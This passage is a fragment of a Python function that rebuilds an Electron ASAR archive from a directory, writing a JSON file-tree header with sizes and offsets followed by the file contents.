            file_data = []
            current_offset = 0
            
            # Build file tree
            def build_tree(path, parent_dict):
                nonlocal current_offset
                for item in path.iterdir():
                    if item.is_dir():
                        parent_dict[item.name] = {'files': {}}
                        build_tree(item, parent_dict[item.name]['files'])
                    else:
                        with open(item, 'rb') as f:
                            data = f.read()
                        parent_dict[item.name] = {
                            'size': len(data),
                            'offset': str(current_offset)
                        }
                        file_data.append(data)
                        current_offset += len(data)
            
            build_tree(source_dir, files_dict)
            
            # Write ASAR
            header = {'files': files_dict}
            header_json = json.dumps(header, separators=(',', ':')).encode('utf-8')
            header_size = len(header_json) + 8
            
            with open(output_asar, 'wb') as f:
                f.write(struct.pack('<I', header_size))
                f.write(struct.pack('<I', header_size + 4))
                f.write(header_json)
                for data in file_data:
                    f.write(data)
            
            if log_fn:
                log_fn(f"[+] Repacked ASAR: {output_asar}")
            return True
        except Exception as e:
            if warn_fn:
                warn_fn(f"ASAR repack failed: {e}")
            return False
